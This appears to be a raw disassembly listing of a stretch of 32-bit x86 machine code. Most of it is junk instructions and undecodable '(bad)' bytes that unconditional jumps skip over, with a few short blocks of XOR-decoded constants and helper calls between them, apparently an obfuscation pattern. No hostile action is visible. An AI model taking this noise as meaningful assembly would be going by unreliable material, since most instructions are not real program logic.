  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0x9a6293a4
  4185cf:	jecxz  0x4185ad
  4185d1:	out    dx,eax
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0xbe
  4185d9:	push   0x38
  4185db:	xchg   edx,eax
  4185dc:	mov    eax,ds:0xf81797a5
  4185e1:	cmp    DWORD PTR [ebx+0x5e34c98e],eax
  4185e7:	hlt    
  4185e8:	pushf  
  4185e9:	mov    esi,0xb19ed485
  4185ee:	jb     0x418640
  4185f0:	out    dx,eax
  4185f1:	push   ds
  4185f2:	push   edx
  4185f3:	daa    
  4185f4:	add    DWORD PTR [ebx+0x2f],edx
  4185f7:	push   0xe4a300d
  4185fc:	cld    
  4185fd:	xor    ebp,ecx
  4185ff:	jmp    0x8709:0x6c58617c
  418606:	sbb    eax,0x4831e564
  41860b:	psllq  mm5,QWORD PTR [ebp+0x49d0271]
  418612:	push   edx
  418613:	ret    0x29f8
  418616:	adc    BYTE PTR [edi+0x5182588d],dh
  41861c:	push   esi
  41861d:	or     eax,0xce19e1
  418622:	push   eax
  418623:	adc    bl,ch
  418625:	test   BYTE PTR [edx],ah
  418627:	pop    ebp
  418628:	mov    ch,BYTE PTR [ecx]
  41862a:	inc    eax
  41862b:	outs   dx,BYTE PTR ds:[esi]
  41862c:	cmp    cl,dh
  41862e:	outs   dx,DWORD PTR ds:[esi]
  41862f:	js     0x418621
  418631:	je     0x418659
  418633:	test   eax,0x21da31ff
  418638:	pop    esi
  418639:	sub    al,BYTE PTR [esi]
  41863b:	push   ecx
  41863c:	in     al,dx
  41863d:	and    eax,0x27d4543a
  418642:	lea    esi,[eax-0x61e1e413]
  418648:	(bad)  
  41864a:	pop    eax
  41864b:	sub    eax,0xa67dbc97
  418651:	aad    0xc9
  418653:	push   ds
  418654:	xchg   edi,eax
  418655:	push   0xa
  418657:	ja     0x418677
  418659:	mov    cx,WORD PTR [ecx+edx*8-0x15]
  41865e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41865f:	popa   
  418660:	push   cs
  418661:	(bad)  
  418662:	and    al,0x66
  418664:	pcmpgtd mm4,QWORD PTR [ebp-0x6b]
  418668:	sub    DWORD PTR [ecx],0x32d8eb33
  41866e:	inc    ebx
  41866f:	js     0x4185ff
  418671:	stc    
  418672:	inc    ecx
  418673:	int3   
  418674:	xchg   edx,eax
  418675:	xchg   ebx,eax
  418676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418677:	ror    bh,0x21
  41867a:	fld    QWORD PTR [edx+0x7d42e4ac]
  418680:	stos   DWORD PTR es:[edi],eax
  418681:	mov    BYTE PTR [eax],ah
  418683:	in     al,0xa3
  418685:	aad    0xef
  418687:	sub    eax,0x86e6585f
  41868c:	into   
  41868d:	stos   DWORD PTR es:[edi],eax
  41868e:	fs adc al,0xa1
  418691:	adc    ebx,DWORD PTR [eax]
  418693:	or     bl,cl
  418695:	xchg   esi,eax
  418696:	cs gs mov dl,0x1e
  41869a:	mov    esi,0xfd9b2ba
  41869f:	test   al,0x64
  4186a1:	ins    DWORD PTR es:[edi],dx
  4186a2:	repnz aas 
  4186a4:	jns    0x4186fb
  4186a6:	fcomp  QWORD PTR [esi-0x62]
  4186a9:	(bad)  
  4186aa:	stc    
  4186ab:	sub    al,0x39
  4186ad:	pop    ds
  4186ae:	imul   edi,DWORD PTR [esi],0x628c0c0f
  4186b4:	pop    ebp
  4186b5:	sbb    edi,DWORD PTR [ecx]
  4186b7:	js     0x418651
  4186b9:	jp     0x418718
  4186bb:	shr    BYTE PTR [eax+0x12738132],1
  4186c1:	jns    0x41864b
  4186c3:	xchg   ebx,eax
  4186c4:	xor    dl,cl
  4186c6:	daa    
  4186c7:	sub    DWORD PTR [esp+ebp*4+0x75],ebp
  4186cb:	add    bl,BYTE PTR [ebx-0x5d39b3c8]
  4186d1:	loop   0x418728
  4186d3:	pop    ebp
  4186d4:	dec    eax
  4186d5:	sbb    DWORD PTR [edx+0x716fe639],edi
  4186db:	adc    ebx,DWORD PTR [ecx-0x3758a90]
  4186e1:	sbb    ah,bl
  4186e3:	mov    esi,0x7d170f26
  4186e8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4186ea:	push   edx
  4186eb:	aas    
  4186ec:	arpl   WORD PTR [ebp-0x1f88ed9c],ax
  4186f2:	sbb    bl,0x37
  4186f5:	sub    BYTE PTR [ebx+0x7b],0xa8
  4186f9:	addr16 jp 0x4186f8
  4186fc:	pop    ebx
  4186fd:	xchg   esi,eax
  4186fe:	fwait
  4186ff:	and    BYTE PTR [edi],dh
  418701:	into   
  418702:	cld    
  418703:	gs add bl,0x39
  418707:	dec    esi
  418708:	fisub  DWORD PTR gs:[eax+0x458f2bed]
  41870f:	push   ecx
  418710:	add    edi,0x34
  418713:	lock gs adc al,0xe8
  418717:	mov    bl,0x61
  418719:	sti    
  41871a:	es out dx,eax
  41871c:	mov    al,ds:0x6414e004
  418721:	and    edi,DWORD PTR [edx-0x48]
  418724:	mov    ah,BYTE PTR [esi-0x36]
  418727:	aas    
  418728:	ret    
  418729:	lods   al,BYTE PTR ds:[esi]
  41872a:	adc    dl,bl
  41872c:	jo     0x418701
  41872e:	call   0x4d7141a2
  418733:	ds or  al,0x27
  418736:	push   ds
  418737:	gs das 
  418739:	pop    ebp
  41873a:	lea    eax,[ebp-0x23]
  41873d:	mov    esi,0x4b9bde32
  418742:	dec    ecx
  418743:	test   eax,0xb3b108c9
  418748:	push   eax
  418749:	mov    bl,0x63
  41874b:	in     al,dx
  41874c:	test   DWORD PTR ds:0x5994f2a5,esp
  418752:	popa   
  418753:	sbb    DWORD PTR [ecx-0x4e],eax
  418756:	clc    
  418757:	or     ebp,DWORD PTR [edi+0x76920512]
  41875d:	pop    esp
  41875e:	and    dl,BYTE PTR [ebx-0x703dfd73]
  418764:	sub    eax,0xc074f73f
  418769:	mov    cl,0x4a
  41876b:	call   0x9d50:0xae610b1b
  418772:	pop    es
  418773:	out    dx,eax
  418774:	sbb    al,0x17
  418776:	dec    ebp
  418777:	or     eax,0xd29d7820
  41877c:	loope  0x418785
  41877e:	cmp    BYTE PTR [edi],cl
  418780:	or     DWORD PTR [edi+ebx*4-0x66],ebx
  418784:	ret    
  418785:	out    0xae,al
  418787:	sbb    DWORD PTR [ebx+0x52],esp
  41878a:	out    dx,eax
  41878b:	xchg   ebx,eax
  41878c:	dec    esi
  41878d:	fld    QWORD PTR [ecx+ecx*4+0x23]
  418791:	xchg   ebp,eax
  418792:	sub    al,0xaf
  418794:	(bad)  
  418795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418796:	test   BYTE PTR [esi],ah
  418798:	xor    al,0xc4
  41879a:	jb     0x4187e9
  41879c:	enter  0x8d6a,0x56
  4187a0:	(bad)  
  4187a1:	das    
  4187a2:	es scas eax,DWORD PTR es:[edi]
  4187a4:	pop    eax
  4187a5:	retf   
  4187a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187a7:	or     al,0x48
  4187a9:	mov    cl,0x37
  4187ab:	inc    esp
  4187ac:	cdq    
  4187ad:	mov    BYTE PTR [ecx],bl
  4187af:	mov    ecx,0x24a4f161
  4187b4:	sub    ah,BYTE PTR [esi+0x552bef7]
  4187ba:	jo     0x4187e0
  4187bc:	add    DWORD PTR [edi+0x23f2c430],ebx
  4187c2:	pop    edi
  4187c3:	rol    ebp,cl
  4187c5:	imul   esi,esi,0x7508cd58
  4187cb:	out    dx,al
  4187cc:	xchg   edx,eax
  4187cd:	adc    edi,ebp
  4187cf:	jl     0x4187af
  4187d1:	stos   DWORD PTR es:[edi],eax
  4187d2:	sbb    DWORD PTR [esi],edi
  4187d4:	jnp    0x41876c
  4187d6:	sbb    al,0xdc
  4187d8:	mov    bh,0xfb
  4187da:	add    eax,0x44a2b896
  4187df:	fldenv [edi-0x794733f1]
  4187e5:	test   eax,0xc8b13e2c
  4187ea:	in     al,0x61
  4187ec:	(bad)  
  4187ed:	ins    DWORD PTR es:[edi],dx
  4187ee:	sti    
  4187ef:	in     eax,0xf3
  4187f1:	out    dx,al
  4187f2:	lods   al,BYTE PTR es:[esi]
  4187f4:	ror    DWORD PTR [edi+0x39854cd3],1
  4187fa:	or     cl,BYTE PTR [eax]
  4187fc:	inc    ebx
  4187fd:	js     0x41880f
  4187ff:	mov    eax,ds:0x8a0153d5
  418804:	or     dh,bh
  418806:	cdq    
  418807:	fs fs fs ins BYTE PTR es:[edi],dx
  41880b:	mov    ah,0x37
  41880d:	pushf  
  41880e:	into   
  41880f:	or     al,0xe9
  418811:	int3   
  418812:	or     al,BYTE PTR [eax-0x13]
  418815:	retf   
  418816:	pushf  
  418817:	mov    bl,0x5
  418819:	inc    esi
  41881a:	add    BYTE PTR ss:[eax],al
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi-0x20169a70],ebx
  418894:	nop
  418895:	push   ebx
  418896:	repz sar BYTE PTR [esi-0x41413dcb],0xb8
  41889e:	dec    edx
  41889f:	cmp    eax,0xac8559c4
  4188a4:	cli    
  4188a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188a6:	arpl   bp,bx
  4188a8:	cs cmp eax,0x9337e6e2
  4188ae:	scas   al,BYTE PTR es:[edi]
  4188af:	mov    ah,0x88
  4188b1:	adc    al,0x90
  4188b3:	sti    
  4188b4:	out    0x8f,eax
  4188b6:	dec    edi
  4188b7:	mov    eax,0x384b7a68
  4188bc:	test   eax,0x4434128f
  4188c1:	test   BYTE PTR [eax+edi*1+0x1a],0xd
  4188c6:	cmp    cl,BYTE PTR [eax*1-0x245b82a7]
  4188cd:	dec    ebp
  4188ce:	loope  0x4188a4
  4188d0:	mov    eax,0xcc055b57
  4188d5:	mov    edx,0xcff47920
  4188da:	test   edx,esi
  4188dc:	jp     0x4188cc
  4188de:	lock and al,0x20
  4188e1:	sti    
  4188e2:	lds    esi,FWORD PTR [esi+0x54]
  4188e5:	(bad)  
  4188e6:	xchg   esi,eax
  4188e7:	mov    ch,0xef
  4188e9:	jmp    0x4177:0x2be492ae
  4188f0:	iret   
  4188f1:	aaa    
  4188f2:	adc    ebp,esi
  4188f4:	jmp    DWORD PTR [edi+0x20]
  4188f7:	jecxz  0x41888b
  4188f9:	cmc    
  4188fa:	add    eax,0xcbdb3e78
  4188ff:	sbb    al,0x78
  418901:	or     eax,0x6a9d8f5f
  418906:	and    esp,esp
  418908:	test   al,0xc2
  41890a:	test   al,0xe0
  41890c:	not    BYTE PTR [edi-0x7cdde775]
  418912:	cmp    DWORD PTR [eax],edi
  418914:	shl    eax,1
  418916:	dec    ebx
  418917:	call   0x60fc241
  41891c:	pushf  
  41891d:	test   DWORD PTR [edi-0x190bb4ab],0x41de3120
  418927:	out    dx,al
  418928:	xchg   edi,eax
  418929:	sub    al,0xc7
  41892b:	out    dx,al
  41892c:	xchg   ebx,eax
  41892d:	sbb    DWORD PTR [edx+0x7a431734],0xd68fdd03
  418937:	inc    edx
  418938:	fild   QWORD PTR [eax]
  41893a:	pushf  
  41893b:	(bad)  
  41893c:	(bad)  
  41893d:	or     BYTE PTR es:[edi+0x7b126d82],dh
  418944:	xchg   BYTE PTR fs:[esi+eax*4-0x5c],al
  418949:	fisttp DWORD PTR ds:0x16157476
  41894f:	add    ah,BYTE PTR [edi+0x1e352072]
  418955:	adc    ebp,DWORD PTR [esi+eiz*1-0x714fb60]
  41895c:	clc    
  41895d:	add    al,0xc7
  41895f:	out    dx,al
  418960:	jmp    0x4188e3
  418962:	add    eax,0x73fca1f1
  418967:	int3   
  418968:	adc    DWORD PTR [edi+0xb27093f],edi
  41896e:	sub    ecx,DWORD PTR [eax-0xd4c465e]
  418974:	pop    edx
  418975:	or     bh,BYTE PTR [eax+0x3e]
  418978:	fistp  DWORD PTR [ebx]
  41897a:	lods   al,BYTE PTR ds:[esi]
  41897b:	idiv   DWORD PTR [edx-0x1d]
  41897e:	cld    
  41897f:	cdq    
  418980:	xor    edi,DWORD PTR [edx-0x33faa9ed]
  418986:	lods   eax,DWORD PTR ds:[esi]
  418987:	les    esi,FWORD PTR [ecx+0x5a44951d]
  41898d:	and    DWORD PTR [edx+edx*2-0x2],0xfffffff9
  418992:	in     al,0x7
  418994:	or     BYTE PTR [ecx],dh
  418996:	add    eax,0x68b089d6
  41899b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41899c:	imul   edi,DWORD PTR [ecx],0x34
  41899f:	into   
  4189a0:	jge    0x418926
  4189a2:	dec    esp
  4189a3:	cwde   
  4189a4:	ficom  WORD PTR [eax]
  4189a6:	scas   al,BYTE PTR es:[edi]
  4189a7:	(bad)  
  4189a8:	lock icebp 
  4189aa:	ror    BYTE PTR [esi],1
  4189ac:	in     al,dx
  4189ad:	(bad)  
  4189ae:	pushf  
  4189af:	pop    edx
  4189b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b1:	push   0xc89a7e45
  4189b6:	sahf   
  4189b7:	loop   0x4189fb
  4189b9:	popa   
  4189ba:	pop    ss
  4189bb:	lahf   
  4189bc:	xchg   ebx,eax
  4189bd:	xor    DWORD PTR [ebp+ecx*4-0x16],ebp
  4189c1:	jecxz  0x4189f0
  4189c3:	mov    ebx,0x9643bac8
  4189c8:	xor    eax,0x73791b1a
  4189cd:	loop   0x4189bb
  4189cf:	mov    ds:0xf78ae523,eax
  4189d4:	aad    0xa9
  4189d6:	and    ecx,DWORD PTR [edi+0x22db414b]
  4189dc:	ins    BYTE PTR es:[edi],dx
  4189dd:	cmovp  ecx,DWORD PTR [ebx+0x7160803c]
  4189e4:	shl    DWORD PTR [esi-0x3e3c89d5],0xac
  4189eb:	mov    ecx,0x1aa9795c
  4189f0:	bound  ebx,QWORD PTR [eax+ebp*8+0x68]
  4189f4:	nop
  4189f5:	adc    DWORD PTR [edi+0x71ea942d],0x3b
  4189fc:	frstor [eax+0x32]
  4189ff:	dec    ebx
  418a00:	loope  0x418a79
  418a02:	test   al,0x46
  418a04:	xor    DWORD PTR [ecx+0xa7f8489],0xe1559210
  418a0e:	dec    ebx
  418a0f:	mov    ebp,ebp
  418a11:	or     ah,BYTE PTR [esi]
  418a13:	mov    ch,0xa9
  418a15:	sti    
  418a16:	mov    esi,0xb9b8cd41
  418a1b:	mov    dh,0xc3
  418a1d:	jecxz  0x418a01
  418a1f:	jo     0x418a0e
  418a21:	aam    0xe9
  418a23:	jp     0x418a9c
  418a25:	loope  0x4189e4
  418a27:	fdivp  st(4),st
  418a29:	gs sub al,0x54
  418a2c:	sar    DWORD PTR [edi+ebx*4-0xc],1
  418a30:	xor    eax,0xf9b80e92
  418a35:	sbb    DWORD PTR [esi],ebp
  418a37:	sar    BYTE PTR [edx-0x80],0x7e
  418a3b:	jle    0x4189cf
  418a3d:	pop    edi
  418a3e:	mov    ecx,0x26fff5be
  418a43:	mov    edx,ebx
  418a45:	adc    edi,esp
  418a47:	dec    eax
  418a48:	adc    ebp,edx
  418a4a:	or     BYTE PTR [edi+edx*2-0x1e],cl
  418a4e:	adc    bh,ch
  418a50:	dec    ebp
  418a51:	mov    ?,WORD PTR [ebx-0x3e0a4e28]
  418a57:	mov    eax,ds:0xb467e35a
  418a5c:	xor    BYTE PTR [esp+edx*8+0x43c2bf91],bh
  418a63:	mov    dh,0x74
  418a65:	repz fsub QWORD PTR [esi+eax*1-0x24]
  418a6a:	sub    al,0xa3
  418a6c:	repz adc al,0x34
  418a6f:	lods   al,BYTE PTR ds:[esi]
  418a70:	int    0x3f
  418a72:	fiadd  DWORD PTR [esi-0x77]
  418a75:	cvttps2pi mm7,xmm4
  418a78:	cmp    DWORD PTR [edi],edx
  418a7a:	and    al,0xdb
  418a7c:	iret   
  418a7d:	lds    edi,FWORD PTR [eax-0x726bf110]
  418a83:	in     al,0x86
  418a85:	scas   eax,DWORD PTR es:[edi]
  418a86:	mov    eax,0x980b6a32
  418a8b:	mov    ds:0x1cdaa04b,eax
  418a90:	call   0xa269:0xf6890c53
  418a97:	cmp    al,0x74
  418a99:	dec    eax
  418a9a:	sub    ah,BYTE PTR [eax]
  418a9c:	sub    dh,ah
  418a9e:	xor    eax,0xe5c46b80
  418aa3:	push   ds
  418aa4:	add    al,0x72
  418aa6:	dec    ebp
  418aa7:	add    eax,0x64b7986c
  418aac:	cli    
  418aad:	ret    
  418aae:	push   esp
  418aaf:	ret    
  418ab0:	call   0x4339:0x1cbba487
  418ab7:	cmp    BYTE PTR [edx],cl
  418ab9:	mov    al,ds:0xa4ab7328
  418abe:	lods   eax,DWORD PTR ds:[esi]
  418abf:	out    dx,eax
  418ac0:	pop    ebx
  418ac1:	je     0x418b17
  418ac3:	into   
  418ac4:	xchg   ebx,eax
  418ac5:	jnp    0x418ab9
  418ac7:	inc    esi
  418ac8:	lds    edx,FWORD PTR [eax+ecx*1]
  418acb:	and    BYTE PTR [esi+ecx*1+0x7a],0x3d
  418ad0:	adc    bh,ch
  418ad2:	in     al,0xd
  418ad4:	test   al,0x30
  418ad6:	ret    0xe495
  418ad9:	inc    ebx
  418ada:	inc    esi
  418adb:	fcmovnb st,st(2)
  418add:	mov    eax,DWORD PTR [esp+0x10]
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x42226c
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x42226c
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	lea    ecx,[edx+0xc]
  418b2b:	xchg   edx,eax
  418b2c:	retf   
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0xdcf0c9d8
  418b38:	sub    al,0x9
  418b3a:	sbb    ecx,esp
  418b3c:	bound  edx,QWORD PTR [eax]
  418b3e:	adc    bh,BYTE PTR [edx-0x19]
  418b41:	fs (bad) 
  418b44:	enter  0xf3b4,0xb
  418b48:	sub    al,0x8
  418b4a:	jmp    0x64372f0b
  418b4f:	sbb    BYTE PTR [esi],cl
  418b51:	out    dx,eax
  418b52:	(bad)  
  418b54:	xor    ebp,eax
  418b56:	push   cs
  418b57:	sub    edx,DWORD PTR [ebx]
  418b59:	leave  
  418b5a:	(bad)  
  418b5b:	hlt    
  418b5c:	sbb    ebp,DWORD PTR [ebp-0x725d4240]
  418b62:	jge    0x418b5b
  418b64:	dec    esi
  418b65:	dec    ebp
  418b66:	(bad)
  418b6a:	inc    esi
  418b6b:	add    ecx,ebx
  418b6d:	imul   esi,DWORD PTR [edi+0x30],0x5ec2314
  418b74:	sahf   
  418b75:	mov    dh,0x3b
  418b77:	fs in  eax,dx
  418b79:	je     0x418bab
  418b7b:	enter  0x3b2f,0x13
  418b7f:	stos   DWORD PTR es:[edi],eax
  418b80:	mov    bh,0x2c
  418b82:	mov    ch,0x4
  418b84:	inc    ebx
  418b85:	and    BYTE PTR [ebp+0x40484339],ah
  418b8b:	test   eax,0x114114fe
  418b90:	or     DWORD PTR [esi+0x261f1b5b],esi
  418b96:	nop
  418b97:	pop    ss
  418b98:	push   ds
  418b99:	cmovg  ebx,DWORD PTR [edi+0x2967a7c0]
  418ba0:	and    BYTE PTR [esi+ebx*2-0x38dca2d3],bh
  418ba7:	stos   DWORD PTR es:[edi],eax
  418ba8:	jl     0x418b52
  418baa:	add    ah,BYTE PTR ds:0x928d03f7
  418bb0:	out    dx,eax
  418bb1:	pop    ds
  418bb2:	ret    
  418bb3:	pop    edi
  418bb4:	xchg   BYTE PTR [ebp+ebx*8+0x48],dh
  418bb8:	or     dh,BYTE PTR [bx+si]
  418bbb:	xor    DWORD PTR [edi+0x72],ecx
  418bbe:	or     bh,cl
  418bc0:	clc    
  418bc1:	push   ebp
  418bc2:	(bad)  
  418bc3:	sbb    DWORD PTR [ecx+eax*8-0x305dfe],ebp
  418bca:	dec    esi
  418bcb:	xchg   edx,eax
  418bcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bcd:	(bad)  
  418bce:	lea    esi,[eax-0x17998f6]
  418bd4:	adc    BYTE PTR [esi],dh
  418bd6:	aas    
  418bd7:	pop    ebx
  418bd8:	cs into 
  418bda:	out    0x72,eax
  418bdc:	stos   BYTE PTR es:[edi],al
  418bdd:	jb     0x418c39
  418bdf:	shl    DWORD PTR [edi+ebp*2+0x7c],1
  418be3:	fnstsw ax
  418be5:	sbb    eax,ebp
  418be7:	add    DWORD PTR [edx+0x138769dd],ecx
  418bed:	div    esi
  418bef:	leave  
  418bf0:	xor    edi,DWORD PTR [edi+0x6f]
  418bf3:	pop    ss
  418bf4:	call   0xc7a377e9
  418bf9:	(bad)  
  418bfa:	mov    ds:0xe7dae5bd,al
  418bff:	not    DWORD PTR [eax-0x7ae08ff4]
  418c05:	sbb    eax,0x65da34b9
  418c0a:	push   0xffffffdb
  418c0c:	add    al,0xe5
  418c0e:	repnz mov eax,ds:0xcd994939
  418c14:	xor    BYTE PTR [edi-0x25],cl
  418c17:	outs   dx,BYTE PTR ds:[esi]
  418c18:	mov    dh,0x41
  418c1a:	pop    ss
  418c1b:	sbb    al,dl
  418c1d:	and    bh,BYTE PTR [esi-0x5775c2b5]
  418c23:	leave  
  418c24:	sub    esp,DWORD PTR [edi]
  418c26:	aas    
  418c27:	pop    esi
  418c28:	push   esi
  418c29:	sar    BYTE PTR [esi+0x4a47d926],1
  418c2f:	jg     0x418c25
  418c31:	lahf   
  418c32:	fucomip st,st(0)
  418c34:	psubw  mm3,QWORD PTR [ebx-0x35235cbc]
  418c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c3c:	inc    ebx
  418c3d:	dec    edi
  418c3e:	(bad)  
  418c3f:	mov    dl,0xba
  418c41:	push   ecx
  418c42:	nop
  418c43:	mov    ebx,0x18ca5492
  418c48:	pop    ds
  418c49:	stos   BYTE PTR es:[edi],al
  418c4a:	mov    edx,0x2fee82e6
  418c4f:	nop
  418c50:	xchg   ebp,eax
  418c51:	imul   ecx,DWORD PTR [ebx+eiz*4],0xd5faa5e9
  418c58:	push   ds
  418c59:	xor    BYTE PTR [edi+0x46],ch
  418c5c:	lods   al,BYTE PTR ds:[esi]
  418c5d:	push   edx
  418c5e:	in     eax,dx
  418c5f:	test   al,0xc7
  418c61:	mov    al,0x56
  418c63:	loopne 0x418be8
  418c65:	mov    ds,WORD PTR [edx+0x7728f72]
  418c6b:	xchg   DWORD PTR [ecx],esi
  418c6d:	scas   al,BYTE PTR es:[edi]
  418c6e:	jmp    0xf238:0x69abaab5
  418c75:	js     0x418c50
  418c77:	add    dh,BYTE PTR [edx]
  418c79:	mov    ah,BYTE PTR [ecx-0x59c3ecfb]
  418c7f:	sub    ebp,DWORD PTR [esi]
  418c81:	retf   0x5c3e
  418c84:	cdq    
  418c85:	pop    edx
  418c86:	inc    edx
  418c87:	push   ebp
  418c88:	mov    al,0xac
  418c8a:	arpl   bx,bp
  418c8c:	jb     0x418c2e
  418c8e:	inc    ebx
  418c8f:	mov    DWORD PTR [edi],eax
  418c91:	mov    dh,0x9f
  418c93:	sub    DWORD PTR [edx+0x57],eax
  418c96:	dec    esp
  418c97:	mov    al,ds:0x2f87261c
  418c9c:	jnp    0x418c9a
  418c9e:	add    BYTE PTR [ecx-0x13],bl
  418ca1:	fsubrp st(4),st
  418ca3:	jl     0x418ca4
  418ca5:	jo     0x418ce6
  418ca7:	push   cs
  418ca8:	push   edx
  418ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418caa:	sub    al,0xea
  418cac:	sub    ch,dh
  418cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418caf:	xlat   BYTE PTR ds:[ebx]
  418cb0:	xor    ecx,DWORD PTR [di]
  418cb3:	in     al,dx
  418cb4:	imul   ecx,DWORD PTR [edx-0x6853b2d],0x25
  418cbb:	loope  0x418d2c
  418cbd:	mov    bh,0xea
  418cbf:	push   ds
  418cc0:	or     eax,0x7e6fd1f6
  418cc5:	xchg   BYTE PTR [ebp-0x4f],cl
  418cc8:	add    cl,ah
  418cca:	clc    
  418ccb:	aaa    
  418ccc:	das    
  418ccd:	inc    BYTE PTR [edx-0x34d3bded]
  418cd3:	aam    0xbe
  418cd5:	push   DWORD PTR [ecx-0x5a]
  418cd8:	dec    eax
  418cd9:	jmp    0x418c9d
  418cdb:	lea    ebp,[edx]
  418cdd:	adc    al,BYTE PTR [ecx-0xcc666c9]
  418ce3:	push   ebx
  418ce4:	mov    dl,0x2f
  418ce6:	aam    0x50
  418ce8:	push   ecx
  418ce9:	pop    ecx
  418cea:	xchg   ebx,eax
  418ceb:	add    al,0xc8
  418ced:	mov    dl,0x96
  418cef:	add    eax,0x95a124b
  418cf4:	in     al,dx
  418cf5:	push   ebx
  418cf6:	sbb    bh,BYTE PTR ds:0xf210ef29
  418cfc:	cdq    
  418cfd:	lods   al,BYTE PTR ds:[esi]
  418cfe:	ss into 
  418d00:	lods   eax,DWORD PTR ds:[esi]
  418d01:	in     al,0x5c
  418d03:	jb     0x418d42
  418d05:	cld    
  418d06:	add    edi,DWORD PTR [ebp*4-0x3c7ea820]
  418d0d:	sbb    bh,BYTE PTR [edx+0x6d58fd50]
  418d13:	popa   
  418d14:	xchg   edx,eax
  418d15:	in     eax,0x49
  418d17:	cs mov ecx,0x5dc30d31
  418d1d:	lea    edx,[esi]
  418d1f:	mov    edx,DWORD PTR [ecx]
  418d21:	mov    ah,0x91
  418d23:	mov    bh,0xe2
  418d25:	xchg   edx,eax
  418d26:	call   0x647e3411
  418d2b:	xor    eax,0xcd0d0418
  418d30:	pop    esi
  418d31:	sbb    DWORD PTR [ecx+0x5b],0x36
  418d35:	aaa    
  418d36:	sar    BYTE PTR ds:0xec53ca4,cl
  418d3c:	(bad)  
  418d3d:	aam    0x43
  418d3f:	cmc    
  418d40:	pop    esp
  418d41:	cmp    BYTE PTR [esi],0xda
  418d44:	sti    
  418d45:	aas    
  418d46:	mov    edx,0x259a110f
  418d4b:	ja     0x418d06
  418d4d:	lock dec ebx
  418d4f:	pop    es
  418d50:	pop    esp
  418d51:	in     eax,dx
  418d52:	out    0x47,eax
  418d54:	cli    
  418d55:	dec    ebx
  418d56:	(bad)  
  418d57:	and    ah,BYTE PTR [esi-0x7bd9f54b]
  418d5d:	jnp    0x418d06
  418d5f:	fcmovnu st,st(4)
  418d61:	popf   
  418d62:	jp     0x418d3e
  418d64:	outs   dx,DWORD PTR ds:[esi]
  418d65:	jae    0x418d36
  418d67:	rcr    esi,cl
  418d69:	aam    0x5b
  418d6b:	mov    ebp,0x827af9b4
  418d70:	(bad)
  418d74:	push   ebx
  418d75:	push   ecx
  418d76:	push   edx
  418d77:	push   eax
  418d78:	call   0x42226c
  418d7d:	mov    ecx,DWORD PTR [esp+0x50]
  418d81:	mov    ebx,DWORD PTR [esp+0x54]
  418d85:	add    eax,ecx
  418d87:	mov    ecx,DWORD PTR [esp+0x88]
  418d8e:	adc    edx,ebx
  418d90:	jmp    0x418fed
  418d95:	jmp    0x6c98:0xba87068d
  418d9c:	mov    bl,0x37
  418d9e:	cmc    
  418d9f:	mov    esp,0x380e78a4
  418da4:	xchg   edx,eax
  418da5:	inc    esp
  418da6:	sti    
  418da7:	sar    BYTE PTR [esi-0x41413dcb],0x70
  418dae:	xor    eax,0x8dccdc9e
  418db3:	(bad)  
  418db4:	(bad)  
  418db5:	pop    edx
  418db6:	arpl   sp,di
  418db8:	sbb    cl,BYTE PTR [edi-0x72]
  418dbb:	ds (bad) 
  418dbd:	dec    esi
  418dbe:	ret    0xd826
  418dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc2:	xchg   esp,eax
  418dc3:	mov    eax,DWORD PTR [eax+edx*1+0x2e]
  418dc7:	stos   DWORD PTR es:[edi],eax
  418dc8:	add    bl,dl
  418dca:	jecxz  0x418dfb
  418dcc:	sub    ah,dl
  418dce:	idiv   DWORD PTR [ecx+0x15]
  418dd1:	fiadd  WORD PTR [esp+edi*4+0x66]
  418dd5:	(bad)  
  418dd6:	in     eax,dx
  418dd7:	adc    DWORD PTR [ebp+0x21],ecx
